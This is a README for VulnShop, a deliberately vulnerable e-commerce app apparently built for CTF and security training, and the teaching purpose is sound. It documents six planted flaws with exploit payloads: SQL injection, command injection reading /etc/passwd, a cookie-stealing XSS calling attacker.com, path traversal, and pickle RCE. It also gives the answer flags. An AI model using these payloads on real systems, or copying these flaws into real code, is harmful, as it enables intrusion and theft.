# VulnShop - Vulnerable E-commerce Platform

A deliberately vulnerable e-commerce platform for security testing and CTF challenges. This application contains 6 different vulnerabilities that you need to exploit to find the flags.

## Setup

1. Create a virtual environment:
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

3. Initialize the database and create sample data:
```bash
python init_db.py
```

4. Run the application:
```bash
python app.py
```

The application will be available at http://localhost:5000

## Vulnerabilities

### 1. SQL Injection in Product Search
**Endpoint**: `/search`
**Flag**: `FLAG{sql_1nj3ct10n_1s_d4ng3r0us}`

The search functionality is vulnerable to SQL injection. The query is constructed using string concatenation:
```python
cursor.execute(f"SELECT * FROM product WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'")
```

**Exploitation**:
1. Visit the search page
2. Enter the following payload:
```
' UNION SELECT id, username, email, password FROM user WHERE username='admin' --
```
3. This will reveal the admin user's password containing the flag

### 2. Command Injection in Image Processing
**Endpoint**: `/process-image`
**Flag**: `FLAG{c0mm4nd_1nj3ct10n_br34ks_s3cur1ty}`

The image processing endpoint uses shell=True and direct string concatenation:
```python
command = f"convert {image_path} -resize 800x600 {image_path}"
```

**Exploitation**:
1. Upload an image
2. Modify the filename to include a command:
```
image.jpg; cat /etc/passwd
```
3. The command will be executed on the server

### 3. XSS in Product Reviews
**Endpoint**: `/add-review/<product_id>`
**Flag**: `FLAG{xss_1s_4_br0ws3r_vuln3r4b1l1ty}`

Reviews are rendered without any sanitization:
```python
return f'<div class="review"><p>Rating: {rating}</p><p>Review: {review}</p></div>'
```

**Exploitation**:
1. Go to any product page
2. Submit a review with the following payload:
```html
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
```
3. When other users view the product, their cookies will be sent to the attacker

### 4. Directory Traversal in Product Images
**Endpoint**: `/product-image/<filename>`
**Flag**: `FLAG{4_d1r3ct0ry_tr4v3rs4l_1s_n0t_s3cur3}`

The image endpoint doesn't validate the filename:
```python
return send_file(f'uploads/{filename}')
```

**Exploitation**:
1. Try accessing files outside the uploads directory:
```
../../../etc/passwd
```
2. The flag is in a secret file in the uploads directory

### 5. Insecure Deserialization in Cart
**Endpoint**: `/update-cart`
**Flag**: `FLAG{d3s3r14l1z4t10n_1s_r1sky}`

The cart update endpoint uses pickle.loads() on user input:
```python
cart = pickle.loads(base64.b64decode(cart_data))
```

**Exploitation**:
1. Create a malicious pickle object:
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('cat /etc/passwd')
        return os.system, (cmd,)

pickled = pickle.dumps(RCE())
print(base64.b64encode(pickled).decode())
```
2. Submit the encoded payload to the cart update endpoint

### 6. Weak Password Reset
**Endpoint**: `/reset-password`
**Flag**: `FLAG{w34k_t0k3ns_4r3_br34k4bl3}`

The password reset uses simple base64 encoding:
```python
token = base64.b64encode(email.encode()).decode()
```

**Exploitation**:
1. Request a password reset for a user
2. The token will be returned in the response
3. Decode the token to get the email:
```python
import base64
decoded = base64.b64decode(token).decode()
print(decoded)
```

## Test Accounts

1. Regular User:
   - Username: test
   - Password: password123
   - Email: test@example.com

2. Admin User:
   - Username: admin
   - Password: FLAG{sql_1nj3ct10n_1s_d4ng3r0us}
   - Email: admin@vulnshop.com

## Note
This application is intentionally vulnerable and should only be used in a controlled environment for educational purposes. The vulnerabilities demonstrated here should never be implemented in production applications. 